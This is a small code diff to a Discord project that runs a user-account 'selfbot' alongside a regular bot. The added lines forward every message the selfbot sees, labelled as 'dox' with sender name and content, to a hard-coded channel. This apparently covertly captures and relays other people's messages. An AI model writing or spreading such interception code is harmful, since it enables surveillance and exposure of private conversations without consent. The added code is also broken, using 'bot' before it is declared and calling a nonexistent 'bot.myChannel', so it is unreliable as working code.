@@ -5,6 +5,8 @@ const keep_alive = require('./keep_alive.js')
 var doxmsg = "" ;
 var doxbool = false;
 var doxmsglen = 0 ;
+myChannel = bot.channels.cache.get("1223919638044344430");
+
 const MySelfBot = new SelfBots.Client();
 const bot = new Discord.Client({
     intents: [
@@ -24,6 +26,7 @@ MySelfBot.on('messageCreate', message => {
 		console.log(message.content);
 		doxmsglen = message.content.length ;
 		doxmsg = "Sender : " + message.author.username +"\n Content : " +message.content ;
+		bot.myChannel.send(doxmsg);
 	}
 });
 
